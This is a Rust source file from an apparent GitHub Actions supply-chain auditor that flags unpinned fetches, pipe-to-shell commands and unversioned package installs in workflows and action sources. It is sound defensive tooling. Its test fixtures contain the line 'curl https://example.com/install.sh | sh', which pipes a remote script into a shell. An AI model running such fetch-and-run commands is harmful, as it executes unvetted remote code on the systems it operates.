use anyhow::{Context, Result};
use serde_norway::Value;
use std::collections::HashSet;
use std::path::Path;
use std::process::ExitCode;
use std::sync::Arc;
use tokio::sync::Semaphore;

use crate::audit_patterns::{
    self, DOCKER_PATTERNS, DOCKER_URL_PATTERNS, JS_PATTERNS, JS_URL_PATTERNS,
    PS_INSTALL_MODULE_UNVERSIONED, PY_PATTERNS, PY_URL_PATTERNS, Pattern,
    SH_CARGO_INSTALL_UNVERSIONED, SH_GEM_INSTALL_UNVERSIONED, SH_GH_RELEASE_LATEST, SH_GIT_CLONE,
    SH_NPM_UNVERSIONED, SH_NPX_UNVERSIONED, SH_PIP_GIT_URL_UNVERSIONED, SH_PIP_UNVERSIONED,
    SHELL_PATTERNS, SHELL_PIPE_PATTERNS, SHELL_URL_PATTERNS, cargo_install_has_version,
    category_str, extract_urls, gem_install_has_version, gh_release_has_tag,
    git_clone_has_pinned_ref, has_checksum_verify, has_git_checkout_sha, npm_install_has_version,
    npx_has_version, pip_git_url_has_ref, pip_install_has_version, ps_install_has_required_version,
    url_has_version,
};
use crate::audited_actions::{AuditSource, AuditedActions};
use crate::auth;
use crate::config::Config;
use crate::github::GitHubClient;
use crate::output::{self, AuditFinding, AuditMatch, AuditReport};
use crate::workflow::{self, ActionRef};
use colored::Colorize;

/// Reason string for matches allowed via the `trusted-hosts` config list.
/// Shared between the allow site and the repo-config notice that counts them.
pub(crate) const REASON_TRUSTED_HOST: &str = "trusted host";

/// Accumulates findings and (when verbose) allowed matches during a scan.
///
/// `push_allowed` is a no-op when `verbose` is false, so callers can record
/// matches unconditionally without caring about the flag.
pub struct AuditCollector {
    pub findings: Vec<AuditFinding>,
    pub allowed: Vec<AuditMatch>,
    pub verbose: bool,
    /// Matches allowed via `trusted-hosts` — counted regardless of verbosity
    /// so the repo-config notice doesn't depend on `--verbose`.
    pub trusted_host_allowed: usize,
}

impl AuditCollector {
    pub fn new(verbose: bool) -> Self {
        Self {
            findings: Vec::new(),
            allowed: Vec::new(),
            verbose,
            trusted_host_allowed: 0,
        }
    }

    pub fn push_finding(&mut self, finding: AuditFinding) {
        self.findings.push(finding);
    }

    pub fn push_allowed(&mut self, allowed: AuditMatch) {
        if allowed.reason == REASON_TRUSTED_HOST {
            self.trusted_host_allowed += 1;
        }
        if self.verbose {
            self.allowed.push(allowed);
        }
    }
}

pub async fn run(
    repo_root: &Path,
    json: bool,
    sarif: bool,
    verbose: bool,
    config: &Config,
) -> Result<ExitCode> {
    // Machine-readable formats must keep stdout clean.
    let quiet = json || sarif;

    let token = auth::resolve_token().await;
    let client = token.as_ref().map(|t| GitHubClient::new(t.clone()));
    let had_token = client.is_some();

    let files = workflow::find_workflows(repo_root)?;
    let mut collector = AuditCollector::new(verbose);
    let mut scanned_actions: HashSet<String> = HashSet::new();
    let mut audited = AuditedActions::new(config.fetch_remote);
    let mut audited_bundled = 0usize;
    let mut audited_local_cache = 0usize;
    let mut audited_remote = 0usize;
    let mut scanned_fresh = 0usize;
    let mut scanned_unpinned_branch = 0usize;
    let mut scanned_unpinned_sliding = 0usize;
    let mut ignored = 0usize;

    for file in &files {
        let display_name = workflow::display_path(file, repo_root);
        if !quiet {
            eprintln!("Scanning {display_name}");
        }

        let content = match std::fs::read_to_string(file) {
            Ok(content) => content,
            Err(e) => {
                // One unreadable/non-UTF-8 workflow shouldn't abort the scan.
                eprintln!("  {} {display_name}: {e}", "skipped".yellow());
                continue;
            }
        };

        match extract_run_blocks(file, &content) {
            Ok(run_blocks) => {
                for (line_offset, run_content) in &run_blocks {
                    scan_shell_content(
                        run_content,
                        &display_name,
                        *line_offset,
                        "",
                        &mut collector,
                        config,
                    );
                }
            }
            Err(e) => {
                // Unparsable YAML shouldn't sink the scan; the `uses:` regex
                // scan below still runs.
                eprintln!(
                    "  {} run-block scan of {display_name}: {e}",
                    "skipped".yellow()
                );
            }
        }

        if let Some(client) = &client {
            let actions = workflow::scan_content(&content);
            for action in &actions {
                let key = format!("{}@{}", action.owner_repo(), action.ref_string);
                if !scanned_actions.insert(key) {
                    continue;
                }

                if config.is_action_ignored(&action.owner_repo()) {
                    ignored += 1;
                    if !quiet {
                        eprintln!(
                            "  {}@{} {}",
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "ignored".dimmed()
                        );
                    }
                    continue;
                }

                if let Some(source) = audited
                    .check(&action.owner, &action.repo, &action.ref_string)
                    .await
                {
                    match source {
                        AuditSource::Bundled => audited_bundled += 1,
                        AuditSource::LocalCache => audited_local_cache += 1,
                        AuditSource::Remote => audited_remote += 1,
                    }
                    if !quiet {
                        eprintln!(
                            "  {}@{} {} ({})",
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "audited".green(),
                            source.label()
                        );
                    }
                    continue;
                }

                let pinned = matches!(
                    action.ref_type,
                    workflow::RefType::Sha | workflow::RefType::Tag
                );

                if !quiet {
                    if pinned {
                        eprintln!(
                            "  {} {}@{}",
                            "Fetching".blue(),
                            action.full_name(),
                            short_sha(&action.ref_string)
                        );
                    } else {
                        eprintln!(
                            "  {} {}@{} {}",
                            "Fetching".blue(),
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "(unpinned)".yellow()
                        );
                    }
                }

                let findings_before = collector.findings.len();
                match scan_action_source(client, action, &mut collector, config).await {
                    Ok(()) => {
                        match action.ref_type {
                            workflow::RefType::Sha | workflow::RefType::Tag => {
                                scanned_fresh += 1;
                            }
                            workflow::RefType::SlidingTag => {
                                scanned_unpinned_sliding += 1;
                            }
                            workflow::RefType::Branch => {
                                scanned_unpinned_branch += 1;
                            }
                        }
                        // Anchor remote-scan findings to the loading `uses:` line
                        // so SARIF results land inside the scanning repo.
                        for finding in collector.findings.iter_mut().skip(findings_before) {
                            finding.workflow_file = Some(display_name.clone());
                            finding.workflow_line = Some(action.line_number);
                        }
                        // Only cache clean verdicts for SHA refs — tag and branch
                        // contents can move after the verdict.
                        if collector.findings.len() == findings_before
                            && action.ref_type == workflow::RefType::Sha
                        {
                            let tag = action.tag_comment.as_deref().unwrap_or(&action.ref_string);
                            audited.cache_clean(
                                &action.owner,
                                &action.repo,
                                &action.ref_string,
                                tag,
                            );
                        }
                    }
                    Err(e) => {
                        eprintln!("warning: could not scan {}: {e}", action.full_name());
                    }
                }
            }
        }
    }

    if !quiet && !files.is_empty() {
        eprintln!();
    }

    let before_filters = collector.findings.len();
    collector.findings.retain(|f| {
        config.meets_severity(&f.severity) && !config.is_pattern_ignored(&f.description)
    });
    let suppressed = before_filters - collector.findings.len();

    // When auditing a repo you don't control, its own .pinprick.toml must not
    // silently set audit policy — say what it changed and how to opt out.
    if config.is_repo_local() {
        let trusted_host_allowed = collector.trusted_host_allowed;
        let mut parts = Vec::new();
        if suppressed > 0 {
            parts.push(format!("findings suppressed: {suppressed}"));
        }
        if ignored > 0 {
            parts.push(format!("actions skipped: {ignored}"));
        }
        if trusted_host_allowed > 0 {
            parts.push(format!("trusted-host fetches: {trusted_host_allowed}"));
        }
        if !parts.is_empty() {
            eprintln!(
                "note: the scanned repo's .pinprick.toml affected results ({}) — rerun with --no-repo-config to ignore it",
                parts.join(", ")
            );
        }
    }

    collector
        .findings
        .sort_by_key(|f| match f.severity.as_str() {
            "high" => 0,
            "medium" => 1,
            _ => 2,
        });

    let has_findings = !collector.findings.is_empty();
    let report = AuditReport {
        actions_scanned: scanned_actions.len(),
        findings: collector.findings,
        allowed: collector.allowed,
        had_token,
        audited_bundled,
        audited_local_cache,
        audited_remote,
        scanned_fresh,
        scanned_unpinned_branch,
        scanned_unpinned_sliding,
        ignored,
    };

    if sarif {
        report.print_sarif();
    } else if json {
        report.print_json();
    } else {
        report.print_human(verbose);
    }

    if has_findings {
        Ok(ExitCode::from(1))
    } else {
        Ok(ExitCode::SUCCESS)
    }
}

pub fn extract_run_blocks(path: &Path, content: &str) -> Result<Vec<(usize, String)>> {
    let yaml: Value =
        serde_norway::from_str(content).with_context(|| format!("parsing {}", path.display()))?;

    let mut blocks = Vec::new();
    let mut cursor: usize = 0; // 0-based line index, monotonically advancing

    // Walk jobs.*.steps[].run. serde_norway's Mapping preserves insertion
    // order, so iterating here visits `run:` blocks in document order and we
    // can anchor each one at the next matching line, never earlier ones.
    if let Some(jobs) = yaml.get("jobs").and_then(|j| j.as_mapping()) {
        for (_job_name, job) in jobs {
            if let Some(steps) = job.get("steps").and_then(|s| s.as_sequence()) {
                for step in steps {
                    if let Some(run) = step.get("run").and_then(|r| r.as_str()) {
                        let (line, next_cursor) = find_run_line(content, run, cursor);
                        cursor = next_cursor;
                        // Line 0 (not found) is kept — the block is still
                        // scanned, just unanchored.
                        blocks.push((line, run.to_string()));
                    }
                }
            }
        }
    }

    Ok(blocks)
}

/// Locate the 1-based line of `run_content` in the raw file, starting the
/// search at `start` (0-based). Returns the line and the cursor to start the
/// next search at. A zero line means "not found"; the cursor is preserved.
///
/// Prefers an exact trimmed-line match so `echo hello` does not steal the
/// position of a longer line like `    echo hello world` that appears first.
/// Falls back to `contains` if no exact match is found past the cursor, which
/// preserves the prior behavior for run blocks that serde_norway normalized.
fn find_run_line(file_content: &str, run_content: &str, start: usize) -> (usize, usize) {
    let Some(first_line) = run_content.lines().next() else {
        return (0, start);
    };
    let trimmed = first_line.trim();
    if trimmed.is_empty() {
        return (0, start);
    }
    let mut contains_hit: Option<usize> = None;
    for (i, line) in file_content.lines().enumerate().skip(start) {
        if line.trim() == trimmed {
            return (i + 1, i + 1);
        }
        if contains_hit.is_none() && line.contains(trimmed) {
            contains_hit = Some(i);
        }
    }
    match contains_hit {
        Some(i) => (i + 1, i + 1),
        None => (0, start),
    }
}

/// Whether a shell source line is a pure comment and thus never executed.
/// Trailing comments on a command line are not covered — stripping an
/// unquoted `#` would require full shell tokenization and risks hiding a
/// real payload embedded in a quoted string.
fn is_shell_comment_line(line: &str) -> bool {
    line.trim_start().starts_with('#')
}

/// Join shell lines ending in `\` into a single logical line, anchored at the
/// 0-based index of the first physical line.
fn join_continuations(content: &str) -> Vec<(usize, String)> {
    let mut out: Vec<(usize, String)> = Vec::new();
    let mut pending: Option<(usize, String)> = None;
    for (i, raw) in content.lines().enumerate() {
        let trimmed_end = raw.trim_end();
        // A comment never continues onto the next line — a trailing backslash
        // is just comment text, so the next line is a new command. Joining it
        // into the comment would hide it from the scan.
        let is_continuation =
            trimmed_end.ends_with('\\') && !(pending.is_none() && is_shell_comment_line(raw));
        let body = if is_continuation {
            &trimmed_end[..trimmed_end.len() - 1]
        } else {
            raw
        };
        match pending.as_mut() {
            Some((_, buf)) => {
                buf.push(' ');
                buf.push_str(body.trim());
            }
            None => {
                pending = Some((i, body.to_string()));
            }
        }
        if !is_continuation && let Some((start, buf)) = pending.take() {
            out.push((start, buf));
        }
    }
    if let Some(p) = pending {
        out.push(p);
    }
    out
}

pub fn scan_shell_content(
    content: &str,
    source_file: &str,
    base_line: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // All passes scan logical lines — a command split across physical lines
    // with trailing backslashes is one shell command, and scanning the pieces
    // separately would let `curl … \` + `<url>` evade every two-part pattern.
    let logical = join_continuations(content);

    // Pipe-to-shell pass runs first so its findings land before `findings_before`
    // and escape the checksum downgrade loop below.
    let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
    for (start, joined) in &logical {
        if is_shell_comment_line(joined) {
            continue;
        }
        let line_num = base_line + start;
        let before = collector.findings.len();
        check_patterns(
            &SHELL_PIPE_PATTERNS,
            joined,
            source_file,
            line_num,
            action_name,
            collector,
        );
        if collector.findings.len() > before {
            pipe_shell_lines.insert(line_num);
        }
    }

    let findings_before = collector.findings.len();

    for (li, (start, line)) in logical.iter().enumerate() {
        let line = line.as_str();
        if is_shell_comment_line(line) {
            continue;
        }
        let line_num = base_line + start;
        if pipe_shell_lines.contains(&line_num) {
            continue;
        }

        let before = collector.findings.len();
        check_patterns(
            &SHELL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        let shell_matched = collector.findings.len() > before;

        // A `/latest/` URL already triggers the high-severity SH_*_LATEST rule
        // in SHELL_PATTERNS. Running SHELL_URL_PATTERNS on the same line would
        // re-flag it as a medium unversioned URL — duplicate noise.
        if !shell_matched {
            check_url_patterns(
                &SHELL_URL_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
                config,
            );
        }

        if SH_GH_RELEASE_LATEST.is_match(line) && !gh_release_has_tag(line) {
            collector.push_finding(AuditFinding {
                severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                description: "gh release download without pinned version".to_string(),
                workflow_file: None,
                workflow_line: None,
            });
        }

        if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
            // Offset 0 covers a one-liner `git clone … && git checkout <sha>`,
            // which pins the content just as deterministically.
            let has_sha_checkout = (0..=3).any(|offset| {
                li + offset < logical.len() && has_git_checkout_sha(&logical[li + offset].1)
            });

            if has_sha_checkout {
                collector.push_allowed(AuditMatch {
                    severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                    category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
                    action: action_name.to_string(),
                    source_file: source_file.to_string(),
                    line: Some(line_num),
                    pattern_matched: line.trim().to_string(),
                    reason: "followed by SHA checkout".to_string(),
                });
            } else {
                collector.push_finding(AuditFinding {
                    severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                    category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
                    action: action_name.to_string(),
                    source_file: source_file.to_string(),
                    line: Some(line_num),
                    pattern_matched: line.trim().to_string(),
                    description: "git clone without pinned ref — clones HEAD of default branch"
                        .to_string(),
                    workflow_file: None,
                    workflow_line: None,
                });
            }
        }

        if SH_PIP_UNVERSIONED.is_match(line) && !pip_install_has_version(line) {
            push_pkg_finding(
                "pip install without version pin",
                audit_patterns::Severity::Low,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_NPM_UNVERSIONED.is_match(line) && !npm_install_has_version(line) {
            push_pkg_finding(
                "npm install without version pin",
                audit_patterns::Severity::Low,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_CARGO_INSTALL_UNVERSIONED.is_match(line) && !cargo_install_has_version(line) {
            push_pkg_finding(
                "cargo install without --version pin",
                audit_patterns::Severity::Low,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_GEM_INSTALL_UNVERSIONED.is_match(line) && !gem_install_has_version(line) {
            push_pkg_finding(
                "gem install without version pin",
                audit_patterns::Severity::Low,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_NPX_UNVERSIONED.is_match(line) && !npx_has_version(line) {
            push_pkg_finding(
                "npx without version pin — fetches and executes latest on every run",
                audit_patterns::Severity::Medium,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if PS_INSTALL_MODULE_UNVERSIONED.is_match(line) && !ps_install_has_required_version(line) {
            push_pkg_finding(
                "PowerShell Install-Module/Install-Script without -RequiredVersion",
                audit_patterns::Severity::Medium,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
        if SH_PIP_GIT_URL_UNVERSIONED.is_match(line) && !pip_git_url_has_ref(line) {
            push_pkg_finding(
                "pip install git+URL without @<ref> — tracks default branch HEAD",
                audit_patterns::Severity::Medium,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
        }
    }

    // Downgrade severity for findings followed by checksum verification.
    // Pipe-shell findings sit below `findings_before`, so they are exempt.
    // Offset 0 covers a one-liner `curl -o f … && sha256sum -c …`.
    for finding in collector.findings.iter_mut().skip(findings_before) {
        if let Some(finding_line) = finding.line {
            let rel = finding_line.saturating_sub(base_line);
            let Some(li) = logical.iter().position(|(start, _)| *start == rel) else {
                continue;
            };
            for offset in 0..=3 {
                if li + offset < logical.len() && has_checksum_verify(&logical[li + offset].1) {
                    finding.severity = downgrade_severity(&finding.severity);
                    finding.description = format!("{} (checksum verified)", finding.description);
                    break;
                }
            }
        }
    }
}

fn downgrade_severity(severity: &str) -> String {
    match severity {
        "high" => "medium".to_string(),
        "medium" => "low".to_string(),
        _ => severity.to_string(),
    }
}

/// Lines longer than this are treated as minified and split on `;` before scanning.
const MINIFIED_LINE_THRESHOLD: usize = 500;

fn scan_js_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    for (i, line) in content.lines().enumerate() {
        let line_num = i + 1;

        if line.len() > MINIFIED_LINE_THRESHOLD {
            for segment in line.split(';') {
                let segment = segment.trim();
                if segment.is_empty() {
                    continue;
                }
                check_patterns(
                    &JS_PATTERNS,
                    segment,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                );
                check_url_patterns(
                    &JS_URL_PATTERNS,
                    segment,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                    config,
                );
            }
        } else {
            check_patterns(
                &JS_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
            check_url_patterns(
                &JS_URL_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
                config,
            );
        }
    }
}

fn scan_py_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    for (i, line) in content.lines().enumerate() {
        let line_num = i + 1;

        check_patterns(
            &PY_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        check_url_patterns(
            &PY_URL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
            config,
        );
    }
}

fn scan_dockerfile_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // Dockerfile RUN instructions lean heavily on trailing-backslash
    // continuations; scan logical lines so a fetch split across physical
    // lines is still seen whole.
    let logical = join_continuations(content);

    // Multi-stage builds name stages via `FROM … AS <name>`. Collect those
    // names so a later `FROM <name>` is recognized as a stage reference, not an
    // image pull — otherwise it false-positives as an untagged image.
    let stage_names: HashSet<String> = logical
        .iter()
        .filter_map(|(_, line)| audit_patterns::dockerfile_stage_alias(line))
        .collect();

    // Escalate `RUN curl ... | sh` from medium (DOCKER_RUN_CURL) to high.
    let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
    for (start, line) in &logical {
        let line_num = start + 1;
        let before = collector.findings.len();
        check_patterns(
            &SHELL_PIPE_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        if collector.findings.len() > before {
            pipe_shell_lines.insert(line_num);
        }
    }

    for (start, line) in &logical {
        let line = line.as_str();
        let line_num = start + 1;

        if audit_patterns::DOCKER_FROM_DIGEST.is_match(line) {
            continue;
        }
        if pipe_shell_lines.contains(&line_num) {
            continue;
        }
        // `FROM <stage>` (an earlier build stage) and `FROM scratch` (the empty
        // base) are not unpinned image pulls — there's nothing to pin.
        if let Some(base) = audit_patterns::dockerfile_from_base(line)
            && (base == "scratch" || stage_names.contains(&base))
        {
            continue;
        }

        check_patterns(
            &DOCKER_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );

        check_url_patterns(
            &DOCKER_URL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
            config,
        );

        if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
            collector.push_finding(AuditFinding {
                severity: output::severity_str(&audit_patterns::Severity::Medium).to_string(),
                category: category_str(&audit_patterns::Category::DockerUnpinned).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                description: "git clone in Dockerfile without pinned ref".to_string(),
                workflow_file: None,
                workflow_line: None,
            });
        }
    }
}

fn push_pkg_finding(
    description: &str,
    severity: audit_patterns::Severity,
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
) {
    collector.push_finding(AuditFinding {
        severity: output::severity_str(&severity).to_string(),
        category: category_str(&audit_patterns::Category::ShellFetch).to_string(),
        action: action_name.to_string(),
        source_file: source_file.to_string(),
        line: Some(line_num),
        pattern_matched: line.trim().to_string(),
        description: description.to_string(),
        workflow_file: None,
        workflow_line: None,
    });
}

fn check_url_patterns(
    patterns: &[Pattern],
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    for pattern in patterns {
        if !pattern.regex.is_match(line) {
            continue;
        }
        // Check EVERY URL, not just the first: a versioned/trusted decoy before
        // the real fetch must not suppress the finding. Allowed only if all URLs
        // are exempt; any unexempt one is a finding.
        let mut allowed_reason: Option<&str> = None;
        let mut dangerous = false;
        for url in extract_urls(line) {
            if url_has_version(url) {
                allowed_reason.get_or_insert("versioned URL");
            } else if config.is_host_trusted(url) {
                allowed_reason.get_or_insert(REASON_TRUSTED_HOST);
            } else if config.is_data_format_exempt(url) {
                allowed_reason.get_or_insert("data format URL");
            } else {
                dangerous = true;
                break;
            }
        }

        if dangerous {
            collector.push_finding(AuditFinding {
                severity: output::severity_str(&pattern.severity).to_string(),
                category: category_str(&pattern.category).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                description: pattern.description.to_string(),
                workflow_file: None,
                workflow_line: None,
            });
        } else if let Some(reason) = allowed_reason {
            collector.push_allowed(AuditMatch {
                severity: output::severity_str(&pattern.severity).to_string(),
                category: category_str(&pattern.category).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                reason: reason.to_string(),
            });
        }
        // No URL on the line: nothing to record.
    }
}

fn check_patterns(
    patterns: &[Pattern],
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
) {
    for pattern in patterns {
        if pattern.regex.is_match(line) {
            collector.push_finding(AuditFinding {
                severity: output::severity_str(&pattern.severity).to_string(),
                category: category_str(&pattern.category).to_string(),
                action: action_name.to_string(),
                source_file: source_file.to_string(),
                line: Some(line_num),
                pattern_matched: line.trim().to_string(),
                description: pattern.description.to_string(),
                workflow_file: None,
                workflow_line: None,
            });
        }
    }
}

/// Third-party dependency dirs, not the action's own source. An action that
/// commits `node_modules/` would otherwise cost thousands of per-file fetches
/// for zero signal. `dist/` is excluded — a bundled `dist/index.js` is the
/// code that actually runs and must still be scanned.
const VENDORED_DIRS: &[&str] = &["node_modules", "site-packages", ".venv", "venv"];

/// Matches whole path components, so `node_modules_helper.js` is not affected.
fn is_vendored_path(path: &str) -> bool {
    path.split('/')
        .any(|component| VENDORED_DIRS.contains(&component))
}

/// Max action source files fetched concurrently. Bounds the fan-out so a
/// file-heavy action doesn't burst into a rate-limit-exhausting wave.
const MAX_CONCURRENT_FILE_FETCHES: usize = 8;

/// Which scanner handles a given action source file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SourceFileKind {
    ActionYml,
    JavaScript,
    Python,
    Dockerfile,
}

/// Select the files in a fetched action tree worth scanning, each paired with
/// its scanner, in tree order. Pure (no I/O) so the filtering is unit testable.
fn select_source_files(
    tree: &[crate::github::TreeEntry],
    base: &str,
) -> Vec<(String, SourceFileKind)> {
    let mut targets = Vec::new();
    for entry in tree {
        if entry.entry_type != "blob" {
            continue;
        }
        let path = &entry.path;
        if is_vendored_path(path) {
            continue;
        }
        if !base.is_empty() && !path.starts_with(base) {
            continue;
        }
        let relative = if base.is_empty() {
            path.as_str()
        } else {
            path.strip_prefix(base)
                .unwrap_or(path)
                .trim_start_matches('/')
        };
        let kind = if relative == "action.yml" || relative == "action.yaml" {
            SourceFileKind::ActionYml
        } else if path.ends_with(".js") || path.ends_with(".ts") {
            SourceFileKind::JavaScript
        } else if path.ends_with(".py") {
            SourceFileKind::Python
        } else if relative == "Dockerfile" || path.ends_with(".dockerfile") {
            SourceFileKind::Dockerfile
        } else {
            continue;
        };
        targets.push((path.clone(), kind));
    }
    targets
}

async fn scan_action_source(
    client: &GitHubClient,
    action: &ActionRef,
    collector: &mut AuditCollector,
    config: &Config,
) -> Result<()> {
    let action_name = format!("{}@{}", action.full_name(), short_sha(&action.ref_string));
    let tree = client
        .fetch_tree(&action.owner, &action.repo, &action.ref_string)
        .await?;

    let base = action.subpath.as_deref().unwrap_or("");
    let targets = select_source_files(&tree, base);
    if targets.is_empty() {
        return Ok(());
    }

    // Fetch concurrently, then scan in tree order so findings are
    // deterministic regardless of which fetch lands first; a failed fetch is
    // skipped.
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_FILE_FETCHES));
    let mut fetches = tokio::task::JoinSet::new();
    for (index, (path, _)) in targets.iter().enumerate() {
        let client = client.clone();
        let owner = action.owner.clone();
        let repo = action.repo.clone();
        let git_ref = action.ref_string.clone();
        let path = path.clone();
        let semaphore = Arc::clone(&semaphore);
        fetches.spawn(async move {
            let _permit = semaphore.acquire_owned().await.ok();
            let content = client.fetch_file(&owner, &repo, &path, &git_ref).await.ok();
            (index, content)
        });
    }

    let mut contents: Vec<Option<String>> = vec![None; targets.len()];
    while let Some(joined) = fetches.join_next().await {
        if let Ok((index, content)) = joined {
            contents[index] = content;
        }
    }

    for ((path, kind), content) in targets.iter().zip(contents) {
        let Some(content) = content else {
            continue;
        };
        let source_label = format!("{} ({path})", action.full_name());
        match kind {
            SourceFileKind::ActionYml => {
                if let Ok(yaml) = serde_norway::from_str::<Value>(&content) {
                    scan_action_yml_runs(&yaml, &source_label, &action_name, collector, config);
                }
            }
            SourceFileKind::JavaScript => {
                scan_js_content(&content, &source_label, &action_name, collector, config);
            }
            SourceFileKind::Python => {
                scan_py_content(&content, &source_label, &action_name, collector, config);
            }
            SourceFileKind::Dockerfile => {
                scan_dockerfile_content(&content, &source_label, &action_name, collector, config);
            }
        }
    }

    Ok(())
}

fn scan_action_yml_runs(
    yaml: &Value,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // runs.steps[].run (composite actions). base_line 0: positions are
    // block-relative — the block is never located inside the fetched file.
    if let Some(steps) = yaml
        .get("runs")
        .and_then(|r| r.get("steps"))
        .and_then(|s| s.as_sequence())
    {
        for step in steps {
            if let Some(run) = step.get("run").and_then(|r| r.as_str()) {
                scan_shell_content(run, source_file, 0, action_name, collector, config);
            }
        }
    }

    // runs.args (some actions use shell: bash with inline scripts)
    if let Some(args) = yaml
        .get("runs")
        .and_then(|r| r.get("args"))
        .and_then(|a| a.as_str())
    {
        scan_shell_content(args, source_file, 0, action_name, collector, config);
    }
}

fn short_sha(sha: &str) -> &str {
    if sha.len() >= 7 { &sha[..7] } else { sha }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::LazyLock;

    static DEFAULT_CONFIG: LazyLock<Config> = LazyLock::new(Config::default);

    #[test]
    fn collector_drops_allowed_when_not_verbose() {
        let mut c = AuditCollector::new(false);
        c.push_allowed(AuditMatch {
            severity: "medium".into(),
            category: "shell_fetch".into(),
            action: String::new(),
            source_file: "test".into(),
            line: Some(1),
            pattern_matched: "curl https://example.com/v1.2.3/foo".into(),
            reason: "versioned URL".into(),
        });
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn collector_keeps_allowed_when_verbose() {
        let mut c = AuditCollector::new(true);
        c.push_allowed(AuditMatch {
            severity: "medium".into(),
            category: "shell_fetch".into(),
            action: String::new(),
            source_file: "test".into(),
            line: Some(1),
            pattern_matched: "curl https://example.com/v1.2.3/foo".into(),
            reason: "versioned URL".into(),
        });
        assert_eq!(c.allowed.len(), 1);
    }

    #[test]
    fn find_run_line_advances_past_earlier_match() {
        // Two `run:` blocks both start with `echo hello`. The second one must
        // map to its own line, not the first occurrence, so severity-downgrade
        // windows and SARIF locations stay anchored correctly.
        let yaml = "\
jobs:
  a:
    steps:
      - run: |
          echo hello
          curl https://example.com/install.sh | sh
      - run: |
          echo hello
          curl https://example.com/install.sh | sh
";
        let (first, cursor) = find_run_line(yaml, "echo hello\n          curl ...", 0);
        assert_eq!(first, 5, "first block should anchor at line 5");
        let (second, _) = find_run_line(yaml, "echo hello\n          curl ...", cursor);
        assert_eq!(
            second, 8,
            "second block must skip the first block's first-line match"
        );
    }

    #[test]
    fn find_run_line_empty_run_content() {
        let (line, cursor) = find_run_line("foo\nbar\n", "", 0);
        assert_eq!((line, cursor), (0, 0));
    }

    #[test]
    fn find_run_line_no_match_preserves_cursor() {
        let (line, cursor) = find_run_line("foo\nbar\n", "baz", 1);
        assert_eq!((line, cursor), (0, 1));
    }

    #[test]
    fn find_run_line_prefers_exact_trimmed_match() {
        // A longer line that `contains` the target shouldn't steal the
        // anchor from the actual run block's first line further down.
        let file = "\
prefix echo hello world
    echo hello
more stuff
";
        let (line, cursor) = find_run_line(file, "echo hello", 0);
        assert_eq!((line, cursor), (2, 2));
    }

    #[test]
    fn find_run_line_falls_back_to_contains() {
        // No exact trimmed match exists, so `contains` still anchors.
        let file = "echo hello world\nother\n";
        let (line, cursor) = find_run_line(file, "echo hello", 0);
        assert_eq!((line, cursor), (1, 1));
    }

    #[test]
    fn is_shell_comment_line_detects_leading_hash() {
        assert!(is_shell_comment_line("# comment"));
        assert!(is_shell_comment_line("    # indented comment"));
        assert!(is_shell_comment_line("\t# tab indent"));
    }

    #[test]
    fn is_shell_comment_line_rejects_trailing_hash() {
        // Trailing comments aren't covered — an unquoted `#` can't be
        // distinguished from one inside a string without real shell parsing.
        assert!(!is_shell_comment_line("echo hello  # note"));
        assert!(!is_shell_comment_line("foo=\"# not a comment\""));
    }

    #[test]
    fn join_continuations_merges_trailing_backslash() {
